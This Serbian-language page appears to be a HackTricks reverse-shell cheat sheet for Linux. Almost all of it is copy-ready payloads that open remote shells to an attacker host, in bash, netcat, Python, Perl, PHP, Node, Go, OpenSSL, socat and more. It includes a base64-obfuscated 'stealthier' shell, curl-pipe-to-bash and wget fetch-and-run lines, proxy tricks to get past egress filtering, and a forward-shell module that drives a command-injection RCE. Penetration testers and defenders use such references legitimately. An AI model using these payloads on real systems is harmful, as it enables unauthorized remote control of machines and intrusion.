# Shells - Linux

{{#include ../../banners/hacktricks-training.md}}

**Ako imate pitanja o bilo kojoj od ovih shell komandi, možete ih proveriti na** [**https://explainshell.com/**](https://explainshell.com/).<sup>[[9]](#references)</sup>

## Full TTY

**Kada dobijete reverse shell,**[ **pročitajte ovu stranicu da biste dobili full TTY**](full-ttys.md)**.**

Osnovni reverse-shell payload-i navedeni u nastavku dokumentovani su i u cheat sheet-ovima HighOn.Coffee i PayloadsAllTheThings; pre izbora proverite da li su interpreter i potrebni alati dostupni na ciljnom sistemu.<sup>[[1]](#references)[[4]](#references)</sup>

## Bash | sh

```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```

Ne zaboravite da proverite i druge shell-ove: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh i bash.

### Shell bezbedan za simbole

```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```

#### Objašnjenje shell-a

Sledeće stavke sumiraju dokumentovano ponašanje Bash-a u interaktivnom režimu i pri redirekciji:<sup>[[10]](#references)[[11]](#references)</sup>

1. **`bash -i`**: Ovaj deo komande pokreće interaktivni (`-i`) Bash shell.
2. **`>&`**: Ovaj deo komande je skraćeni zapis za **preusmeravanje standardnog izlaza** (`stdout`) i **standardne greške** (`stderr`) na **isto odredište**.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Ovo je posebna datoteka koja **predstavlja TCP vezu sa navedenom IP adresom i portom**.
   - **Preusmeravanjem izlaznog toka i toka grešaka u ovu datoteku**, komanda efektivno šalje izlaz interaktivne shell sesije na mašinu napadača.
4. **`0>&1`**: Ovaj deo komande **preusmerava standardni ulaz (`stdin`) na isto odredište kao i standardni izlaz (`stdout`)**.

### Napravite datoteku i izvršite je

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```

## Forward Shell

Kada je RCE dostupan, ali firewall, NAT ili outbound filtering blokira reverse shell, forward shell preko RCE kanala može da obezbedi poluinteraktivnu sesiju.<sup>[[12]](#references)</sup>

Preporučeni alat za ovu namenu je [toboggan](https://github.com/n3rada/toboggan.git), koji omotava primitivu za izvršavanje komandi u interaktivnu sesiju.<sup>[[12]](#references)</sup>

Da biste koristili toboggan, napravite Python modul prilagođen RCE kontekstu ciljnog sistema; njegov interfejs modula očekuje funkciju `execute(command, timeout)` koja vraća izlaz komande.<sup>[[12]](#references)</sup> Na primer, modul pod nazivom `nix.py` mogao bi da bude strukturisan ovako:

```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
    # Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
    token = jwt.encode(
        {"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
    )

    response = httpx.get(
        url="https://vulnerable.io:3200",
        headers={"Authorization": f"Bearer {token}"},
        timeout=timeout,
        # ||BURP||
        verify=False,
    )

    # Check if the request was successful
    response.raise_for_status()

    return response.text
```

Pokrenite modul koristeći trenutni oblik komandne linije alata toboggan:<sup>[[12]](#references)</sup>

```shell
toboggan nix.py
```

Ovo pokreće interaktivnu sesiju. Za ugrađeni Burp Suite backend koristite `toboggan --request burp_request.xml`; za backend sa command-wrapper-om koristite `toboggan --exec-wrapper '<command_template>'`.<sup>[[12]](#references)</sup>

Druga mogućnost je `IppSec` forward-shell implementacija [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).<sup>[[13]](#references)</sup>

Potrebno je da izmenite sledeće delove:<sup>[[13]](#references)</sup>

- URL ranjivog hosta
- Prefiks i sufiks payload-a (ako ih ima)
- Način slanja payload-a (headers? data? dodatne informacije?)

Zatim možete da **šaljete komande** ili upotrebite komandu **`upgrade`** da biste dobili potpuni PTY; implementacija proverava izlaz u približnim intervalima od 1,3 sekunde.<sup>[[13]](#references)</sup>

## Netcat

```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## BusyBox

BusyBox objedinjuje mnoge uslužne programe u jednu malu izvršnu datoteku i čest je na malim ili ugrađenim Linux sistemima. Ako nema samostalnog `nc`, proverite da li ga BusyBox nudi:<sup>[[8]](#references)[[19]](#references)</sup>

```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```

Ako `busybox nc` postoji, ali je interaktivno izvršavanje nepouzdano, prilagodite FIFO obrazac iz odeljka `nc` tom appletu:<sup>[[2]](#references)[[8]](#references)</sup>

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```

## gsocket

Pogledajte zvanična uputstva za postavljanje na [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/).<sup>[[14]](#references)</sup>

```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```

## Telnet

```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## Whois

**Napadač**

```bash
while true; do nc -l <port>; done
```

Koristite isti niz unosa Enter/CTRL+D koji je opisan u odeljku Whois.<sup>[[3]](#references)</sup>

**Žrtva**

```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```

## Python

```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

## Perl

```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## PHP

```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```

## Java

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Ncat

```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```

### Preko eksplicitnog izlaznog proxy-ja

Ako cilj može da pristupi HTTP `CONNECT` ili SOCKS proxy-ju, ali ne može direktno da uspostavi TCP vezu sa listener-om, koristite **Ncat** u connect režimu. Proxy mora da dozvoli tunel do hosta i porta listener-a; `CONNECT` prosleđuje bajtove tek nakon uspostavljanja veze, tako da obična shell sesija **nije** HTTP saobraćaj niti je šifrovana samo zato što koristi HTTP proxy.<sup>[[20]](#references)[[21]](#references)[[22]](#references)</sup>

```bash
# Attacker: expose a listener reachable from the proxy
ncat -l 443

# Target: HTTP CONNECT proxy (default proxy type)
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type http --exec "/bin/sh -i" <ATTACKER_HOST> 443

# Target: use this instead for a SOCKS5 proxy
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type socks5 --exec "/bin/sh -i" <ATTACKER_HOST> 443
```

Za autentifikovani proxy, Ncat prihvata `--proxy-auth` ili `NCAT_PROXY_AUTH` (ovo drugo izbegava navođenje kredencijala u argumentima komande).<sup>[[23]](#references)</sup> Proxy podrazumevano razrešava imena odredišnih hostova; koristite `--proxy-dns local` samo kada je potrebno lokalno razrešavanje.<sup>[[23]](#references)</sup> Ako proxy zahteva TLS ili aplikacione protokole koji prevazilaze `CONNECT`, koristite odgovarajući šifrovani transport umesto da pretpostavite da port 443 prikriva raw shell; pogledajte [tunneling and port forwarding](../tunneling-and-port-forwarding.md) za transport zasnovan na WebSocket-u.<sup>[[22]](#references)[[24]](#references)</sup>

## Golang

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

## Lua

```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## NodeJS

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```

## Zsh (ugrađeni TCP)

```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```

## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – moderan netcat-sličan listener napisan u Rust-u.<sup>[[5]](#references)</sup>

```bash
# Attacker – interactive listener with history & tab-completion
rcat listen -ib 55600

# Victim – download a Linux release binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64 -o /tmp/rcat \
  && chmod +x /tmp/rcat \
  && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```

Funkcije dokumentovane u projektu uključuju:<sup>[[5]](#references)</sup>
- Istoriju komandi i automatsko dovršavanje pomoću tastera Tab u interaktivnom režimu
- `-s` za izbor shell izvršne datoteke koju koristi `connect`

## pwncat-cs

Ako već imate **bilo kakav raw reverse shell**, ali želite listener koji može da uspostavi upotrebljiviju sesiju, `pwncat-cs` može da obradi vezu i pokuša da obezbedi udaljeni PTY.<sup>[[7]](#references)</sup>

```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```

Takođe podržava **šifrovane** `ssl-bind` i `ssl-connect` kanale, pa ga možete upariti sa payload-ima `ncat --ssl` ili `socat OPENSSL:` kada vam je potrebna enkripcija transporta.<sup>[[7]](#references)</sup>

## revsh (šifrovan i spreman za pivotovanje)

`revsh` je mali C klijent/server koji pruža puni TTY preko **šifrovanog Diffie-Hellman tunela** i može opciono da priključi interfejs **TUN/TAP** za pivotovanje nalik obrnutoj VPN vezi.<sup>[[6]](#references)</sup>

```bash
# Build after preparing the OpenSSL dependency as described in the repository README
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443
revsh -c 0.0.0.0:443

# Victim – reverse shell over the encrypted tunnel
./revsh <ATTACKER-IP>:443
```

Korisne zastavice dokumentovane za `revsh` uključuju:<sup>[[6]](#references)</sup>
- `-b`: režim bind-shell (omogućite ga na oba kraja)
- `-D [LHOST:]LPORT` ili `-B [RHOST:]RPORT`: dinamičko prosleđivanje SOCKS 4/4a/5 saobraćaja
- `-x`: onemogućava automatsko podešavanje proxy-ja, uključujući podrazumevano podešavanje TUN/TAP interfejsa

Šifrovani tunel sprečava izlaganje shell saobraćaja u obliku otvorenog teksta, ali sam po sebi ne zaobilazi mrežnu politiku.<sup>[[6]](#references)</sup>

## OpenSSL

U ovom odeljku se koriste OpenSSL komande `req`, `s_server` i `s_client` za kreiranje sertifikata i prenos shell-a preko TLS-a.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

Napadač (Kali)

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```

Žrtva

```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```

I dalje možete da koristite klasični obrazac **two-listener** kada želite odvojene ulazne/izlazne kanale.<sup>[[16]](#references)[[17]](#references)</sup>

```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

## Awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## Finger

**Napadač**

```bash
while true; do nc -l 79; done
```

Da biste poslali komandu, upišite je, pritisnite Enter, pa CTRL+D (da biste zaustavili STDIN).<sup>[[3]](#references)</sup>

**Žrtva**

```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```

## Gawk

```bash
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```

## Xterm

Ovo će pokušati da se poveže sa vašim sistemom na portu 6001.<sup>[[2]](#references)</sup>

```bash
xterm -display 10.0.0.1:1
```

Da biste uhvatili reverse shell, koristite X server koji sluša na portu 6001, kao što je prikazano ispod.<sup>[[2]](#references)</sup>

```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```

## Groovy

autor [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). NAPOMENA: Java reverse shell radi i za Groovy.<sup>[[18]](#references)</sup>

```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## References

- [1] [Podsetnik za Reverse Shell: PHP, ASP, Netcat, Bash i Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Podsetnik za Reverse Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [3] [Korišćenje Whois i Finger za Reverse Shell](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [4] [PayloadsAllTheThings - Podsetnik za Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [rustcat - Savremeni osluškivač porta i reverse shell](https://github.com/robiot/rustcat)
- [6] [revsh - Reverse shell sa podrškom za terminal, tuneliranjem podataka i naprednim mogućnostima pivotiranja](https://github.com/emptymonkey/revsh)
- [7] [pwncat (pwncat-cs) - platforma za post-exploitation](https://github.com/calebstewart/pwncat)
- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
- [9] [explainshell.com](https://explainshell.com/)
- [10] [Referentni priručnik za Bash: Preusmeravanja](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
- [11] [Referentni priručnik za Bash: Pokretanje Bash-a](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [12] [toboggan](https://github.com/n3rada/toboggan)
- [13] [forward-shell](https://github.com/IppSec/forward-shell)
- [14] [Uputstva za implementaciju Global Socket-a](https://www.gsocket.io/deploy/)
- [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
- [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
- [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
- [18] [Reverse Shell u čistom Groovy/Java jeziku](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
- [19] [BusyBox](https://busybox.net/about.html)
- [20] [Ncat: Proxy posredovanje](https://nmap.org/ncat/guide/ncat-proxy.html)
- [21] [Ncat: Izvršavanje komandi](https://nmap.org/ncat/guide/ncat-exec.html)
- [22] [RFC 9110: CONNECT](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.6)
- [23] [Referentni vodič za Ncat](https://nmap.org/book/ncat-man.html)
- [24] [README za wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
{{#include ../../banners/hacktricks-training.md}}
